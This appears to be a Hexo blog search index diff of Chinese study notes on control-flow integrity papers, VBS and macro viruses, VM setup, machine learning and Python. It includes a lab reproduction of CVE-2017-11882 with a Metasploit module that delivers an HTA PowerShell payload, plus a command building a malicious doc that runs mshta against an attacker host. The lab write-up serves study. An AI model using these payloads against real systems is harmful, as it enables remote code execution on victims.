+<h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><p>@inproceedings{conti2015losing,<br>  title={Losing control: On the effectiveness of control-flow integrity under stack attacks},<br>  author={Conti, Mauro and Crane, Stephen and Davi, Lucas and Franz, Michael and Larsen, Per and Negro, Marco and Liebchen, Christopher and Qunaibit, Mohaned and Sadeghi, Ahmad-Reza},<br>  booktitle={Proceedings of the 22nd ACM SIGSAC Conference on Computer and Communications Security},<br>  pages={952--963},<br>  year={2015}<br>}</p>
+]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
+      <tags>
+        <tag>CFI</tag>
+        <tag>attack</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Out of Control: Overcoming Control-Flow Integrity</title>
+    <url>/2021/08/01/out-of-control-overcoming-control-flow-integrity/</url>
+    <content><![CDATA[<h1 id="阅读记录"><a href="#阅读记录" class="headerlink" title="阅读记录"></a>阅读记录</h1><blockquote>
+<p>文章速览:</p>
+<ol>
+<li>评估了当前CFI的安全性</li>
+<li>构造了利用链</li>
+<li>给出IE8 On Windows 7的POC</li>
+</ol>
+</blockquote>
+<h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><pre class="line-numbers language-none"><code class="language-none">@inproceedings{goktas2014out,
+  title={Out of control: Overcoming control-flow integrity},
+  author={G{\"o}ktas, Enes and Athanasopoulos, Elias and Bos, Herbert and Portokalidis, Georgios},
+  booktitle={2014 IEEE Symposium on Security and Privacy},
+  pages={575--589},
+  year={2014},
+  organization={IEEE}
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
+      <tags>
+        <tag>CFI</tag>
+        <tag>S&amp;P</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Modular control-flow integrity</title>
+    <url>/2021/07/27/modular-control-flow-integrity/</url>
+    <content><![CDATA[<h1 id="阅读笔记"><a href="#阅读笔记" class="headerlink" title="阅读笔记"></a>阅读笔记</h1><blockquote>
+<p>关键词：seperate compilation<br>总览：解决了动态链接时构建CFI困难的问题，通过在构建两个table(没看懂)来实现CFI的功能，并在每次动态链接的时候生成新的CFG(使用类型分析方法),并相应的更新IDs table来实现动态链接程序的CFI。</p>
+</blockquote>
+<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ul>
+<li>CFI在遇到动态链接代码的时候会遇到什么样的问题？</li>
+</ul>
+<h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><p>@inproceedings{niu2014modular,<br>  title={Modular control-flow integrity},<br>  author={Niu, Ben and Tan, Gang},<br>  booktitle={Proceedings of the 35th ACM SIGPLAN Conference on Programming Language Design and Implementation},<br>  pages={577--587},<br>  year={2014}<br>}</p>
+]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
+      <tags>
+        <tag>CFI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Practical Control Flow Integrity and Randomization for Binary Executables</title>
+    <url>/2021/07/30/practical-control-flow-integrity-and-randomization-for-binary-executables/</url>
+    <content><![CDATA[<h1 id="阅读记录"><a href="#阅读记录" class="headerlink" title="阅读记录"></a>阅读记录</h1><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ul>
+<li>ASLR &amp; DEP</li>
+<li>代码不会自我修改或者自动生成<h2 id="问题与讨论"><a href="#问题与讨论" class="headerlink" title="问题与讨论"></a>问题与讨论</h2></li>
+<li>CFI难以在工业中应用的难点？<ul>
+<li>overhead</li>
+<li>依赖source code</li>
+</ul>
+</li>
+<li>如何实现其Binary only的特性？</li>
+<li>在二进制中如何识别indirect call/jmp instructions？<ul>
+<li>做了一些假设，主要是根据重定位表等信息来获取合法调用目标</li>
+</ul>
+</li>
+<li>针对该方法的攻击？<ul>
+<li>伪造合法目标</li>
+<li>改变内存页面保护属性或者直接添加伪造目标</li>
+<li>使用程序中的危险目标</li>
+<li>链式攻击，通过一连串合法的目标最终调用危险函数</li>
+</ul>
+</li>
+</ul>
+<h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><p>@inproceedings{zhang2013practical,<br>  title={Practical control flow integrity and randomization for binary executables},<br>  author={Zhang, Chao and Wei, Tao and Chen, Zhaofeng and Duan, Lei and Szekeres, Laszlo and McCamant, Stephen and Song, Dawn and Zou, Wei},<br>  booktitle={2013 IEEE Symposium on Security and Privacy},<br>  pages={559--573},<br>  year={2013},<br>  organization={IEEE}<br>}</p>
+]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
+      <tags>
+        <tag>CFI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Counterfeit Object-Oriented Programming: On the Difficulty of Preventing Code Reuse Attacks in C++ Applications</title>
+    <url>/2021/08/01/counterfeit-object-oriented-programming-on-the-difficulty-of-preventing-code-reuse-attacks-in-c-applications/</url>
+    <content><![CDATA[<h1 id="阅读记录"><a href="#阅读记录" class="headerlink" title="阅读记录"></a>阅读记录</h1><blockquote>
+<p>文章速览:COOP</p>
+</blockquote>
+<p>绕过CFI执行函数的方法：</p>
+<img src="/2021/08/01/counterfeit-object-oriented-programming-on-the-difficulty-of-preventing-code-reuse-attacks-in-c-applications/%E7%BB%95%E8%BF%87CFI%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E7%9A%84%E6%96%B9%E6%B3%95.png" class="">
+<h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><p>@inproceedings{schuster2015counterfeit,<br>  title={Counterfeit object-oriented programming: On the difficulty of preventing code reuse attacks in C++ applications},<br>  author={Schuster, Felix and Tendyck, Thomas and Liebchen, Christopher and Davi, Lucas and Sadeghi, Ahmad-Reza and Holz, Thorsten},<br>  booktitle={2015 IEEE Symposium on Security and Privacy},<br>  pages={745--762},<br>  year={2015},<br>  organization={IEEE}<br>}</p>
+]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
+      <tags>
+        <tag>CFI</tag>
+        <tag>attack</tag>
+        <tag>S&amp;P</tag>
+        <tag>COOP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Fine-grained control-flow integrity for kernel software</title>
+    <url>/2021/08/07/fine-grained-control-flow-integrity-for-kernel-software/</url>
+    <content><![CDATA[<h1 id="1-阅读记录"><a href="#1-阅读记录" class="headerlink" title="1. 阅读记录"></a>1. 阅读记录</h1><p>本文主要是针对内核提出了一种细粒度的CFI。</p>
+<h2 id="1-1-Compute-CFG"><a href="#1-1-Compute-CFG" class="headerlink" title="1.1. Compute CFG"></a>1.1. Compute CFG</h2><h3 id="1-1-1-Compute-Indirect-Call-Targets"><a href="#1-1-1-Compute-Indirect-Call-Targets" class="headerlink" title="1.1.1. Compute Indirect Call Targets"></a>1.1.1. Compute Indirect Call Targets</h3><p>在计算indirect call targets方面，本文主要使用的是静态污点分析的方法。本文对函数指针的使用做了两个假设(对于两个假设的合理性，本文进行了补充说明)：</p>
+<ul>
+<li>函数指针的唯一运算操作是赋值<ul>
+<li>原文：We believe arbitrary computations on function pointers are unlikely due to considerations such as readability, maintainability, and portability<br>即本文认为考虑到程序的可读性、可维护性、可移植性等要素，不应该对函数指针做复杂的运算操作</li>
+</ul>
+</li>
+<li>不会有数据指针指向函数指针</li>
+</ul>
+<p>关于污点分析的实现，本文选择污染所有被函数f的函数指针，然后对其进行传播，最后的结果形式为f-&gt;set(fptr)</p>
+<p>另外，本文对type analysis做出了评价，认为其既会导致误报也会导致漏报：</p>
+<ul>
+<li>误报：无关的目标拥有和函数指针相同的签名</li>
+<li>漏报：签名不同的函数被强行赋值给了某函数指针</li>
+</ul>
+<h3 id="1-1-2-Compute-Return-Targets"><a href="#1-1-2-Compute-Return-Targets" class="headerlink" title="1.1.2. Compute Return Targets"></a>1.1.2. Compute Return Targets</h3><p>结果形式：call sites→set(return instructions)</p>
+<p>主要难点：汇编代码</p>
+<p>算法思路：递归</p>
+<h2 id="1-2-Enforce-CFI"><a href="#1-2-Enforce-CFI" class="headerlink" title="1.2. Enforce CFI"></a>1.2. Enforce CFI</h2><h3 id="1-2-1-Enforcement-Policy"><a href="#1-2-1-Enforcement-Policy" class="headerlink" title="1.2.1. Enforcement Policy"></a>1.2.1. Enforcement Policy</h3><img src="/2021/08/07/fine-grained-control-flow-integrity-for-kernel-software/CFI%E5%8A%A0%E5%9B%BA%E7%AD%96%E7%95%A5.jpg" class="">
+
+<p>关于s4的解释，主要是防止在内核返回用户态的时候被修改返回地址，劫持控制流。因为在状态切换的时候，代码的执行范围已经超出了内核的CFG，CFI将不会再对其进行检查。</p>
+<h3 id="1-2-2-Performance-Overhead"><a href="#1-2-2-Performance-Overhead" class="headerlink" title="1.2.2. Performance Overhead"></a>1.2.2. Performance Overhead</h3><p>在提高CFI效率方面，本文主要使用了两种方法：</p>
+<ul>
+<li>复用程序中已有的check instruction</li>
+<li>将indirect call转化成direct call<ul>
+<li>本文认为，某些非直接调用只是为了表现代码的灵活性，实际上它的调用目标只有1个，可以使用静态分析的方法找出这唯一的调用目标，从而将indirect call转变成direct call，以减小CFI的开销。<br>原文:in many cases kernel software only uses one target for indirect control transfers</li>
+</ul>
+</li>
+</ul>
+<h1 id="2-Cite"><a href="#2-Cite" class="headerlink" title="2. Cite"></a>2. Cite</h1><p>@inproceedings{ge2016fine,<br>  title={Fine-grained control-flow integrity for kernel software},<br>  author={Ge, Xinyang and Talele, Nirupama and Payer, Mathias and Jaeger, Trent},<br>  booktitle={2016 IEEE European Symposium on Security and Privacy (EuroS&amp;P)},<br>  pages={179--194},<br>  year={2016},<br>  organization={IEEE}<br>}</p>
+]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
+      <tags>
+        <tag>CFI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>VBS脚本病毒和宏病毒</title>
+    <url>/2021/08/10/vbs-jiao-ben-bing-du-he-hong-bing-du/</url>
+    <content><![CDATA[<h1 id="VBS脚本病毒"><a href="#VBS脚本病毒" class="headerlink" title="VBS脚本病毒"></a>VBS脚本病毒</h1><h2 id="VBS的概念和使用"><a href="#VBS的概念和使用" class="headerlink" title="VBS的概念和使用"></a>VBS的概念和使用</h2><p>轻量级解释型语言</p>
+<p>管理远程或本地计算机</p>
+<h2 id="传播方式"><a href="#传播方式" class="headerlink" title="传播方式"></a>传播方式</h2><ol>
+<li>自我复制</li>
+<li>Email传播</li>
+<li>局域网共享文件搜索</li>
+<li>其它传播方式：网页、IRC</li>
+</ol>
+<h2 id="自我保护"><a href="#自我保护" class="headerlink" title="自我保护"></a>自我保护</h2><ol>
+<li>自加密</li>
+<li>检测危险对象</li>
+<li>改变对象声明的方法</li>
+<li>尝试关闭反病毒软件</li>
+</ol>
+<h1 id="宏病毒"><a href="#宏病毒" class="headerlink" title="宏病毒"></a>宏病毒</h1><h2 id="什么是宏？"><a href="#什么是宏？" class="headerlink" title="什么是宏？"></a>什么是宏？</h2><p>组织到一起的命令</p>
+<p>VBA</p>
+<h2 id="传播方式-1"><a href="#传播方式-1" class="headerlink" title="传播方式"></a>传播方式</h2><p>支持自动执行宏</p>
+<p>感染：</p>
+<ol>
+<li>内建宏 单个文档</li>
+<li>全局宏 模板</li>
+</ol>
+<p>感染路径：</p>
+<ol>
+<li>单机：单个文档→模板→多个文档</li>
+<li>网络：电子邮件</li>
+</ol>
+<h2 id="自我保护-1"><a href="#自我保护-1" class="headerlink" title="自我保护"></a>自我保护</h2><ol>
+<li>禁止提示信息</li>
+<li>屏蔽命令菜单</li>
+<li>隐藏真实代码</li>
+</ol>
+]]></content>
+      <categories>
+        <category>病毒</category>
+      </categories>
+      <tags>
+        <tag>脚本病毒</tag>
+        <tag>宏病毒</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>虚拟机环境配置</title>
+    <url>/2021/08/12/xu-ni-ji-huan-jing-pei-zhi/</url>
+    <content><![CDATA[<h1 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h1><p>配置网络的时候一定要把网卡对应上！</p>
+<h2 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h2><p>桥接模式对应的网卡就是宿主机本身使用的网卡</p>
+<h3 id="复制物理网络连接状态"><a href="#复制物理网络连接状态" class="headerlink" title="复制物理网络连接状态"></a>复制物理网络连接状态</h3><p>复制物理网卡连接状态，就是说把你指定的、本机的、真实网卡的状态信息复制给虚拟机的虚拟网卡，比如说你的本机真实网卡链接到了家用路由器的LAN口上，获得到了DHCP分配的地址，那么你的虚拟网卡就好像和真是网卡接入了同一台交换机中，也可以获得DHCP分配到的地址。</p>
+<h2 id="Host-only"><a href="#Host-only" class="headerlink" title="Host-only"></a>Host-only</h2><p>一般对应VM1网卡,不与外网相连</p>
+<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol>
+<li><p>eth0网卡丢失.<br> ifconfig -a发现eth0网卡仍然存在.    </p>
+ <img src="/2021/08/12/xu-ni-ji-huan-jing-pei-zhi/ifconfig_a.png" class="">    
+<p> ifconfig eth0 up以后没有ipv4地址！    </p>
+ <img src="/2021/08/12/xu-ni-ji-huan-jing-pei-zhi/%E7%BD%91%E5%8D%A1%E9%87%8D%E5%90%AF.png" class="">    
+<p> 解决方案1：设置静态ip然后重启网络服务    </p>
+ <img src="/2021/08/12/xu-ni-ji-huan-jing-pei-zhi/%E9%9D%99%E6%80%81ip.png" class="">      
+<p> /etc/init.d/networking restart</p>
+</li>
+<li><p>Linux无法ping通windows虚拟机，但是windows可以ping通linux虚拟机<br> 原因：windows的防火墙没有关掉</p>
+</li>
+</ol>
+<h1 id="开机启动"><a href="#开机启动" class="headerlink" title="开机启动"></a>开机启动</h1><ol>
+<li>服务自启动 <pre class="line-numbers language-none"><code class="language-none">systemctl enable/disable [service]
+chkconfig [service] on/off<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+</ol>
+<h1 id="硬盘"><a href="#硬盘" class="headerlink" title="硬盘"></a>硬盘</h1><h2 id="硬盘扩容"><a href="#硬盘扩容" class="headerlink" title="硬盘扩容"></a>硬盘扩容</h2><p>ubuntu硬盘扩容：gparted一键扩容</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>机器学习</title>
+    <url>/2021/08/13/ji-qi-xue-xi/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>两类问题：分类、预测</p>
+<h1 id="正规方程"><a href="#正规方程" class="headerlink" title="正规方程"></a>正规方程</h1><p><a href="https://zhuanlan.zhihu.com/p/60719445">https://zhuanlan.zhihu.com/p/60719445</a></p>
+<h1 id="过拟合问题"><a href="#过拟合问题" class="headerlink" title="过拟合问题"></a>过拟合问题</h1><h2 id="代价函数"><a href="#代价函数" class="headerlink" title="代价函数"></a>代价函数</h2><p>代价函数作文章，减少某些特征的影响   </p>
+<img src="/2021/08/13/ji-qi-xue-xi/%E4%BB%A3%E4%BB%B7%E5%87%BD%E6%95%B01.jpg" class="">   
+
+
+<p>正则化<br>缩小所有参数的值    </p>
+<img src="/2021/08/13/ji-qi-xue-xi/%E4%BB%A3%E4%BB%B7%E5%87%BD%E6%95%B02.png" class="">   
+<p>图中的λ称为正则化参数。<br>为什么能起到缩小所有参数的作用？<br>引入的式子是二次项。加入任意1个参数θ<sub>i</sub>变大为θ<sub>i</sub>'，都会有J(θ<sub>1</sub>,θ<sub>2</sub>,...,θ<sub>i</sub>,...) &lt;= J(θ<sub>1</sub>,θ<sub>2</sub>,...,θ<sub>i</sub>',...)<br>所谓调参，其实就是调整λ的值</p>
+<h1 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h1><p>神经元模型    </p>
+<img src="/2021/08/13/ji-qi-xue-xi/%E7%A5%9E%E7%BB%8F%E5%85%83%E6%A8%A1%E5%9E%8B.png" class="">]]></content>
+      <categories>
+        <category>机器学习</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>cve-2017-11882漏洞分析</title>
+    <url>/2021/08/14/cve-2017-11882-lou-dong-fen-xi/</url>
+    <content><![CDATA[<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><pre class="line-numbers language-none"><code class="language-none">实验环境：
+1. kali 2020.03 ip:192.168.98.200
+2. windows 7 x64 + office 2016
+3. msf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="POC-计算器"><a href="#POC-计算器" class="headerlink" title="POC-计算器"></a>POC-计算器</h2><p>poc来源：<a href="https://github.com/Ridter/CVE-2017-11882">https://github.com/Ridter/CVE-2017-11882</a><br>打开example.rtf,弹出计算器。    </p>
+<img src="/2021/08/14/cve-2017-11882-lou-dong-fen-xi/%E8%AE%A1%E7%AE%97%E5%99%A8.png" class="">
+
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>msf利用脚本</p>
+<pre class="line-numbers language-rb" data-language="rb"><code class="language-rb">## This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+
+class MetasploitModule  &lt; Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::HttpServer
+
+  def initialize(info  = {})
+    super(update_info(info,
+      'Name' =&gt; 'Microsoft Office Payload Delivery',
+      'Description' =&gt; %q{
+        This module generates an command to place within
+        a word document, that when executed, will retrieve a HTA payload
+        via HTTP from an web server. Currently have not figured out how
+        to generate a doc.
+      },
+      'License' =&gt; MSF_LICENSE,
+      'Arch' =&gt; ARCH_X86,
+      'Platform' =&gt; 'win',
+      'Targets' =&gt;
+        [
+          ['Automatic', {} ],
+        ],
+      'DefaultTarget' =&gt; 0,
+    ))
+  end
+
+  def on_request_uri(cli, _request)
+    print_status("Delivering payload")
+    p = regenerate_payload(cli)
+    data = Msf::Util::EXE.to_executable_fmt(
+      framework,
+      ARCH_X86,
+      'win',
+      p.encoded,
+      'hta-psh',
+      { :arch =&gt; ARCH_X86, :platform =&gt; 'win '}
+    )
+    send_response(cli, data, 'Content-Type' =&gt; 'application/hta')
+  end
+
+
+  def primer
+    url = get_uri
+    print_status("Place the following DDE in an MS document:")
+    print_line("mshta.exe \"#{url}\"")
+  end
+end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>将脚本放入/usr/share/metasploit-framework/modules/exploits/windows目录中。</p>
+<h3 id="生成doc文档"><a href="#生成doc文档" class="headerlink" title="生成doc文档"></a>生成doc文档</h3><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh"># 生成doc文档
+python Command109b_CVE-2017-11882.py -c "mshta http://192.168.98.200:8080/abc" -o test.doc
+
+# 方便靶机下载
+python -m SimpleHTTPServer 6666<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>靶机访问 <a href="http://192.168.98.200:6666/">http://192.168.98.200:6666/</a> 下载test.doc</p>
+<h3 id="攻击机监听"><a href="#攻击机监听" class="headerlink" title="攻击机监听"></a>攻击机监听</h3><img src="/2021/08/14/cve-2017-11882-lou-dong-fen-xi/%E5%88%A9%E7%94%A81.png" class="">   
+<img src="/2021/08/14/cve-2017-11882-lou-dong-fen-xi/%E5%88%A9%E7%94%A82.png" class="">   
+<p>靶机打开test.doc<br>利用成功    </p>
+<img src="/2021/08/14/cve-2017-11882-lou-dong-fen-xi/%E5%88%A9%E7%94%A83.png" class="">   
+<img src="/2021/08/14/cve-2017-11882-lou-dong-fen-xi/%E5%88%A9%E7%94%A84.png" class="">   
+
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Mitigating Code-Reuse Attacks with Control-Flow Locking</title>
+    <url>/2021/08/17/mitigating-code-reuse-attacks-with-control-flow-locking/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>python</title>
+    <url>/2021/07/02/python/</url>
+    <content><![CDATA[<h1 id="networkx"><a href="#networkx" class="headerlink" title="networkx"></a>networkx</h1><h2 id="边"><a href="#边" class="headerlink" title="边"></a>边</h2><h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 建立一条结点A到结点B的边，其对应属性attr1的值为val1，对应属性attr2的值为val2</span>
+G<span class="token punctuation">.</span>add_edges_from<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">"attr1"</span><span class="token punctuation">:</span>val1<span class="token punctuation">,</span><span class="token string">"attr2"</span><span class="token punctuation">:</span>val2<span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+<span class="token comment"># 获取属性值</span>
+G<span class="token punctuation">[</span><span class="token string">"A"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"B"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"attr1"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="边是否存在"><a href="#边是否存在" class="headerlink" title="边是否存在"></a>边是否存在</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">G<span class="token punctuation">.</span>has_edge<span class="token punctuation">(</span>node1<span class="token punctuation">,</span>node2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<h1 id="pandas"><a href="#pandas" class="headerlink" title="pandas"></a>pandas</h1><h2 id="创建DataFrame"><a href="#创建DataFrame" class="headerlink" title="创建DataFrame"></a>创建DataFrame</h2><ul>
+<li>columns为列名，按行赋值   <img src="/2021/07/02/python/pandas%E5%88%9B%E5%BB%BADataFrame(3).png" class=""></li>
+</ul>
+<h2 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h2><ul>
+<li>csv<pre class="line-numbers language-none"><code class="language-none">read_csv(filename)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+<h2 id="写入数据"><a href="#写入数据" class="headerlink" title="写入数据"></a>写入数据</h2><ul>
+<li>csv  <pre class="line-numbers language-python" data-language="python"><code class="language-python">wine_reviews<span class="token punctuation">.</span>head<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string">"wine_reviews.csv"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+<h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><ul>
+<li>改数值<img src="/2021/07/02/python/pandas_DataFrame%E6%94%B9%E6%95%B0%E5%80%BC.png" class=""></li>
+</ul>
+]]></content>
+      <categories>
+        <category>编程语言</category>
+      </categories>
+      <tags>
+        <tag>图算法</tag>
+      </tags>
+  </entry>
 </search>
